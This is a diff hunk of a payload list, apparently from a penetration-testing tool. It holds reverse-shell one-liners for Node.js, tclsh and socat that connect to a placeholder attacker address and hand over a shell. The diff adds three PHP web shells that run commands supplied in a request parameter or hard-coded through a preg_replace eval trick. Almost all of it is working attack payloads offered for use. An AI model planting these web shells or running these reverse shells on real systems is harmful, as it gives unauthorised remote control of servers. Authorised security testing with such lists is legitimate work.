@@ -35,3 +35,6 @@ NODE.JS REVERSE SHELL|(function(){var net=require("net"),cp=require("child_proce
 TCLSH REVERSE SHELL|echo 'set s [socket [IPADDR] [PORT]];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
 SOCAT|socat exec:'[PREFERED_SHELL] -li',pty,stderr,setsid,sigint,sane tcp:[IPADDR]:[PORT],forever &
 SOCAT WINDOWS|socat.exe -d -d TCP4:[IPADDR]:[PORT] EXEC:'cmd.exe',pipes
+PHP WEB REVERSE SHELL|<?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?>
+PHP HTTP HEADER REVERSE SHELL|<?php system($_REQUEST['HTTP_USER_AGENT']); ?>
+PHP WEB REVERSE SHELL|<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
